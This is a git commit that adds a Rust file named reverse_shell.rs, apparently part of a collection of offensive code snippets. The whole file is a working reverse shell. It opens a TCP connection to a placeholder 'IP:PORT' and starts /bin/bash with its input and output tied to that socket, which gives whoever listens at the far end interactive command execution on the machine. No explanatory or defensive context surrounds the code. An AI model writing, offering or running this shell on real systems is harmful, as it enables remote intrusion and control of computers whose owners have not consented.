c3a698eb53128e2659219b7c4d3e3ee9aeefbe6a
Corvo <50427765+rf-peixoto@users.noreply.github.com>
2022-09-27 08:49:07 -0300

    Create reverse_shell.rs

---
+++ Code/Rust/reverse_shell.rs
@@ -0,0 +1,16 @@
+use std::net::TcpStream;
+use std::os::unix::io::{AsRawFd, FromRawFd};
+use std::process::{Command, Stdio};
+
+fn main() {
+    let s = TcpStream::connect("IP:PORT").unwrap();
+    let fd = s.as_raw_fd();
+    Command::new("/bin/bash")
+        .stdin(unsafe { Stdio::from_raw_fd(fd) })
+        .stdout(unsafe { Stdio::from_raw_fd(fd) })
+        .stderr(unsafe { Stdio::from_raw_fd(fd) })
+        .spawn()
+        .unwrap()
+        .wait()
+        .unwrap();
+}
